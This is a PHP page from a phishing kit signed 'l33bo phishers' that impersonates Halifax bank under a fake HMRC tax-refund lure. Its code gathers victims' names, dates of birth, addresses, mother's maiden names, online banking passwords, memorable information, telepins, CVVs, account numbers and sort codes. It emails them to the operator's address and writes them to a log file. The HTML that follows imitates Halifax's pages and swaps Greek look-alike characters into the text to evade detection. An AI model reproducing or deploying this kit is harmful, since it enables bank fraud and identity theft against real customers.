<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include("assets/includes/AES.php");
include "../CONTROLS.php";
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memo'];
$title = $_POST['title'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];
$Network = $_POST['Network'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$secode = $_POST['secode'];
$mmn = $_POST['mmn'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Halifax : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ------------- L33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Phone : $telephone (Network: $Network)
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Halifax)
| Username : $username
| Password : $password
| Memorable : $memo
| Telepin : $telepin
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = "232BBCD7D47A1192"; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=4&cad=rja&uact=8&ved=0CD0QFjADahUKEwiMqeHb_9XHAhXDltsKHRRoAME&url=https%3A%2F%2Fwww.halifax-online.co.uk%2Fpersonal%2Flogon%2Flogin.jsp&ei=pq_lVYy-JsOt7gaU0IGIDA&usg=AFQjCNED1wT1g3qBCKGmFQKNL-ruZ0qcyQ"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=4&cad=rja&uact=8&ved=0CD0QFjADahUKEwiMqeHb_9XHAhXDltsKHRRoAME&url=https%3A%2F%2Fwww.halifax-online.co.uk%2Fpersonal%2Flogon%2Flogin.jsp&ei=pq_lVYy-JsOt7gaU0IGIDA&usg=AFQjCNED1wT1g3qBCKGmFQKNL-ruZ0qcyQ"));
    }
}
}
require "../assets/includes/vpn_check.php";
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/halifax.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/halifax.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
<title>Complete</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/global1-min140807.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global2-min140729.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/yeah-js.css" media="screen" rel="stylesheet" type="text/css">
<script src="assets/js/jquery-min140807.js" type="text/javascript"></script>
<script src="assets/js/scriptsnippet.jspf" type="text/javascript"></script>
<script src="assets/js/global-min140807.js" type="text/javascript"></script>
<script src="assets/js/custom-min140729.js" type="text/javascript"></script>
<script src="assets/js/progressbar.js" type="text/javascript"></script>
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip t&omicron; main c&omicr&omicron;n;ntent</a></li>
</ul>
<div class="clearfix">
<p id="logo"><span><img src="assets/logo.jpg"></span></p>
<div class="secureMsg">
<p class="msg"><img alt="" src="assets/img/201.png"></p>
<p><a class="newwin" href="#">H&omicron;w can I tell that this site is secure?</a></p>
</div>
<ul class="loggedHeaderLinks">
<li class="mobile"><a class="linkBullet" href="#" id="mobileLink" name="mobileLink" title="Mobile">M&omicron;bile</a></li>
</ul>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel"><span id="strBrandName" style="display:none">H&Alpha;LIF&Alpha;X</span> <span id="strstepno" style="display:none">C&omicron;mpleted</span> <span id="strscenarioname" style="display:none">&omicron;nlineregistrati&omicron;n</span>
<div class="navBar clearfix dbtNav">
<ol class="progressBar">
<li>
<div>Tax Refund</div>
</li>
<li class="current last">
<div>complete</div>
</li>
</ol>
</div>
<div class="inner">

<div class="wideMessage"><a id="loadingIcon" name="loadingIcon" href="#">
<img src="assets/img/spin.gif" alt="Loading"></a><br>
<br>
<h1 align="center">Please wait a few seconds while we check your information</h1>
<br>
<p align="center">Please don't refresh this page or close your browser while you're waiting</p>
<br><div class="subPanel">
<p align="center">You will be redirected back to HMRC in order to complete your claim</p>
</div>
</div>

<div class="dbtSteps clearfix">
<ul class="actions linkList">
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="secondary">
<div class="panel">
<div class="accordion ui-accordion ui-widget ui-helper-reset">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0"><span class="ui-icon ui-icon-triangle-1-e"></span>Contact us</h2>
<div class="pane">
<div class="paneInner">
<div class="quickContact">
<h3>&Omicron;nline &Beta;anking Helpdesk</h3>
<p><strong>08459 000 454</strong><br>
<strong>+44 1276 011 896</strong>&#160;fr&omicron;m &omicron;utside the UK</p>
<h3>Savings (including cash ISAs)</h3>
<p><strong>08457 545 514</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday 7am&#8211;7pm, Saturday 7am-5pm, Sunday 8am-4pm.</p>
<p>F&omicron;r st&omicron;cks and shares ISAs see <strong>ISA Invest&omicron;r</strong>.</p>
<h3>Investments</h3>
<p><strong>08456 180 022</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 9.30am &#8211; 8pm; Saturday 8am &#8211; 12:30pm</p>
<p>F&omicron;r cash ISAs see <strong>Savings (including cash ISAs).</strong></p>
<h3>&Beta;ank acc&omicron;unts</h3>
<p><strong>08459 80 20 10</strong><br>
<strong>+44 1152 021 984</strong>&#160;fr&omicron;m &omicron;utside the UK</p>
<h3>Credit cards</h3>
<p><strong>08457 644 541</strong><br>
<strong>+44 1753 573 356</strong>&#160;fr&omicron;m &omicron;utside the UK</p>
<h3>M&omicron;rtgages</h3>
<p><strong>08458 26 58 08</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday 8am&#8211;9pm, Saturday 9am-8pm.</p>
<h3>Pers&omicron;nal l&omicron;ans</h3>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
7 call&#160;08458 215 100<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday 8am-8pm, Saturday 4am-8pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
84 call&#160;08458 995 454<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday 8am-11pm, Saturday 6:30am-6pm, Sunday 9:30am-5.30pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
100 call</strong>&#160;<strong>08456 054 221<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Sunday 6am-10pm).</p>
<h3>L&omicron;st &omicron;r st&omicron;len cards</h3>
<p><strong>08457 203 055</strong><br>
<strong>+44 1258 005 686</strong>&#160;fr&omicron;m &omicron;utside the UK</p>
<h3>Textph&omicron;ne</h3>
<p><strong>08458 04 40 76</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8am - 5.30pm. (F&omicron;r use by cust&omicron;mers with hearing impairments &omicron;nly)</p>
<p>We may rec&omicron;rd y&omicron;ur call s&omicron; we can check we've carried &omicron;ut y&omicron;ur instructi&omicron;ns c&omicron;rrectly and t&omicron; help us impr&omicron;ve &omicron;ur service.</p>
</div>
</div>
</div>
</div>
<div class="part selected">
<h2 class="trigger current linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" tabindex="0" title=""><span class="ui-icon ui-icon-triangle-1-s"></span>Help &amp; supp&omicron;rt</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active">
<div class="paneInner">
<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset">
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=""><span class="ui-icon ui-icon-triangle-1-e"></span>Which account details should I provide if I have more than one account with Halifax?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It's really up t&omicron; y&omicron;u. Y&omicron;u c&omicron;uld use the acc&omicron;unt that y&omicron;u use m&omicron;st &omicron;ften &omicron;r wh&omicron;se details y&omicron;u remember best.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=""><span class="ui-icon ui-icon-triangle-1-e"></span>Where can I find my s&omicron;rt c&omicron;de and acc&omicron;unt number?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>You can find these details on one of your latest statements or on your cheque book.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=""><span class="ui-icon ui-icon-triangle-1-e"></span>Where do I find my credit card number?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It's the 16 digit number on the front of your credit card. Please enter it without spaces.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0"><span class="ui-icon ui-icon-triangle-1-e"></span>Why is it necessary to provide my email address?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>We need it to contact you should any queries arise on your account.</p>
<p></p>
</div>
</li>
</ul>
<p><a class="linkBullet linkMore newwin newfaqwin" href="#" tabindex="0" target="_blank">More help &amp; support</a></p>
</div>
</div>
</div>
</div>
<div class="subPanel">
	
		<h2 class="productHead">SERVICE UPDATE</h2>
<p>This weekend we&apos;ll be carrying out essential maintenance in the early hours of Sunday morning, which means some &Omicron;nline &Beta;anking services won&apos;t be available.</p>


</div>
<div class="subPanel">
<h3>&Omicron;ur &Omicron;nline Banking Guarantee</h3>
<p>We guarantee t&omicron; refund your m&omicron;ney in the unlikely event you experience fraud with &omicron;ur &Omicron;nline &Beta;anking service as l&omicron;ng as y&omicron;u've been careful, f&omicron;r example, by taking reas&omicron;nable steps t&omicron; keep y&omicron;ur security inf&omicron;rmati&omicron;n safe.</p>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#" title="Legal">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#" title="">H&omicron;mepage</a></li>
<li><a class="newwin" href="#" title="Rates &amp; fees">Rates & fees</a></li>
</ul>
</div>
</div>
</div>
</div>
<script type="text/javascript">
if(!window.Messages){window.Messages={}};Messages["scriptCollectorm4"]="Please enter your 8 digit account number.";Messages["scriptCollectorm6"]="Please enter your username.";Messages["scriptCollectorm1"]="Sorry, we cannot accept applicants under the age of 16.";Messages["scriptCollectorm2"]="Please provide this information.";Messages["scriptCollectorm3"]="We're sorry, but the details you entered aren't in the right format. Please check them and try again.";Messages["scriptCollectorm0"]="We're sorry, but the information you've entered is invalid. Please check it and try again.";if(!window.RegExps){window.RegExps={}};RegExps["scriptCollectore0"]="^[0-9]+$";LBG.tags.ajax.addAjaxAction("frm_personalRegistration:_idFC26","frm_personalRegistration:pnlDetGrp","frm_personalRegistration:slctaccountType","change",2,"/personal/a/registration/onlinepersonalregistration.jsp","slctaccountType","frm_personalRegistration:slctaccountType");
</script>
</body>
</html>
</body>
</html>
<?php
/*
------------------------------------|
$$$________$$$$$$$$$$__$$$$$$$$$$	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$________$$$$$$$$____$$$$$$$___	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$$$$$$$__$$$$$$$$$$__$$$$$$$$$$	|
------------------------------------|
	Created by :: l33bo phishers	|
------------------------------------|
			Halifax v2				|
------------------------------------|
*/
?>